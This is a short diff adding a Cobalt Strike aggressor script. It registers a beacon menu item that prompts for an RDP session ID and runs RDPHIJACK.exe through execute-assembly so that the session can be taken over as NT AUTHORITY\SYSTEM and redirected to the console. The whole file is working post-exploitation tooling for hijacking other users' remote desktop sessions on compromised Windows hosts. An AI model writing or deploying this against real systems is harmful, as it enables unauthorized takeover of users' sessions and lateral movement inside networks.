@@ -1,0 +1,16 @@
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redirect to console session
+item "Hijack Session as SYSTEM and redirect to console session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsyscon($bid);
+		}
+}
+
+
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redierct to console session
+sub rdpsyscon{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --console");
+}, $bids => $1)); 
+}
